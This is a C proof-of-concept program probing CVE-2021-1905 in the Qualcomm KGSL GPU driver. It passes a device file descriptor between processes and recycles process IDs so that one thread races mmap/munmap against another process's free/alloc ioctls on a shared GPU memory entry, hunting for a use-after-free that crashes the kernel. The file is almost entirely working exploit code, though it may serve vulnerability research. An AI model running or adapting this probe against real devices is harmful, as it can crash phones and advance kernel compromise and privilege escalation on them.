/* CVE-2021-1905 endgame — Surface 1/2 concurrency probe.
 *
 * Two processes share one kgsl_process_private (pid-number reuse). The parent
 * holds fd_A and churns mmap/munmap of entry id=1 while the recycled-tgid
 * sibling (fd_C, same private) churns FREE_ID/ALLOC of that entry. Looks for a
 * refcount/UAF window ("memory mapping of multiple processes simultaneously").
 *
 * Exploratory; if the device oopses that is the signal. Safe-ish to repeat.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_get_info { unsigned long gpuaddr; unsigned int id, flags; size_t size, mmapsize; unsigned long useraddr; unsigned long __pad[4]; };
struct kgsl_gpumem_free_id { unsigned int id, __pad; };
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_free_id)
#define IOCTL_PMEM_GET_INFO _IOWR(KGSL_IOC_TYPE,0x36,struct kgsl_gpumem_get_info)
#define DEV "/dev/kgsl-3d0"

static int send_fd(int sock,int fd){
    char b[1]={'x'}; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    struct cmsghdr*c=CMSG_FIRSTHDR(&m); c->cmsg_level=SOL_SOCKET; c->cmsg_type=SCM_RIGHTS; c->cmsg_len=CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(c),&fd,sizeof fd); return sendmsg(sock,&m,0)<0?-1:0;
}
static int recv_fd(int sock){
    char b[1]; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    if(recvmsg(sock,&m,0)<0) return -1;
    for(struct cmsghdr*c=CMSG_FIRSTHDR(&m);c;c=CMSG_NXTHDR(&m,c))
      if(c->cmsg_level==SOL_SOCKET&&c->cmsg_type==SCM_RIGHTS){int fd;memcpy(&fd,CMSG_DATA(c),sizeof fd);return fd;}
    return -1;
}

static unsigned long g_gpuaddr=0; static unsigned g_memid=0; static int g_fdA=-1;
static _Atomic int g_stop=0; static _Atomic unsigned long g_mmaps=0;

static void *churn(void *a){
    (void)a;
    while(!atomic_load(&g_stop)){
        void *p=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,g_fdA,(off_t)g_gpuaddr);
        if(p!=MAP_FAILED){ memset(p,0xCD,0x1000); munmap(p,0x1000); atomic_fetch_add(&g_mmaps,1); }
    }
    return NULL;
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl 1905 concurrency probe ==\n");
    int sp[2]; if(socketpair(AF_UNIX,SOCK_DGRAM,0,sp)){perror("sp");return 1;}
    pid_t A=fork();
    if(A==0){
        close(sp[0]);
        int fd=open(DEV,O_RDWR); if(fd<0){printf("A open: %s\n",strerror(errno));_exit(1);}
        struct kgsl_gpumem_alloc_id a; memset(&a,0,sizeof a); a.size=0x1000;
        if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&a)<0){printf("A alloc: %s\n",strerror(errno));_exit(1);}
        char info[64]; int k=snprintf(info,sizeof info,"%lu %u",a.gpuaddr,a.id);
        send_fd(sp[1],fd); write(sp[1],info,k);
        printf("A: pid=%d id=%u gpuaddr=0x%lx\n",(int)getpid(),a.id,a.gpuaddr);
        _exit(0);
    }
    close(sp[1]);
    g_fdA=recv_fd(sp[0]);
    char info[64]={0}; read(sp[0],info,sizeof info-1);
    sscanf(info,"%lu %u",&g_gpuaddr,&g_memid);
    printf("[*] parent fd_A=%d gpuaddr=0x%lx id=%u\n",g_fdA,g_gpuaddr,g_memid);

    pthread_t th; pthread_create(&th,NULL,churn,NULL);
    int reap; while(waitpid(-1,&reap,WNOHANG)>0){}
    printf("[*] recycling pid %d; sibling will churn FREE/ALLOC vs parent mmap...\n",(int)A);
    int hit=0; long forks=0, ffail=0;
    for(long i=0;i<200000 && !hit;i++){
        pid_t c=fork();
        if(c<0){ ffail++; if(ffail>2000) break; usleep(500); continue; }
        if(c==0){
            int fd=open(DEV,O_RDWR);
            if(fd>=0){
                struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
                int r=ioctl(fd,IOCTL_PMEM_GET_INFO,&gi);
                if(r>=0 && gi.id==g_memid){
                    char o[96]; int k=snprintf(o,sizeof o,"[+] pid=%d inherited; churning 40000 iters\n",(int)getpid()); write(1,o,k);
                    unsigned long freed=0,allocs=0,ebusy=0;
                    for(int j=0;j<40000;j++){
                        struct kgsl_gpumem_free_id fi; memset(&fi,0,sizeof fi); fi.id=gi.id;
                        int fr=ioctl(fd,IOCTL_PMEM_FREE_ID,&fi);
                        if(fr==0) freed++; else if(errno==EBUSY) ebusy++;
                        struct kgsl_gpumem_alloc_id na; memset(&na,0,sizeof na); na.size=0x1000;
                        if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&na)==0){ allocs++;
                            /* keep gi.id pointing at a live entry */
                            memset(&gi,0,sizeof gi); gi.gpuaddr=na.gpuaddr; gi.id=na.id; }
                    }
                    k=snprintf(o,sizeof o,"[+]   freed=%lu allocs=%lu ebusy=%lu final_id=%u\n",freed,allocs,ebusy,gi.id); write(1,o,k);
                    _exit(42);
                }
                close(fd);
            }
            _exit(0);
        }
        forks++;
        int st; while(waitpid(-1,&st,WNOHANG)>0){ if(WIFEXITED(st)&&WEXITSTATUS(st)==42) hit=1; }
        if((forks & 0x3fff)==0) printf("... %ld forks mmaps=%lu\n",forks,atomic_load(&g_mmaps));
    }
    atomic_store(&g_stop,1); pthread_join(th,NULL);
    while(waitpid(-1,&reap,0)>0){}
    printf("[*] hit=%d forks=%ld parent_mmaps=%lu\n",hit,forks,atomic_load(&g_mmaps));
    { struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
      int r=ioctl(g_fdA,IOCTL_PMEM_GET_INFO,&gi);
      printf("[*] parent GET_INFO -> %d id=%u size=%zu\n",r,gi.id,gi.size); }
    printf("== done ==\n");
    return 0;
}
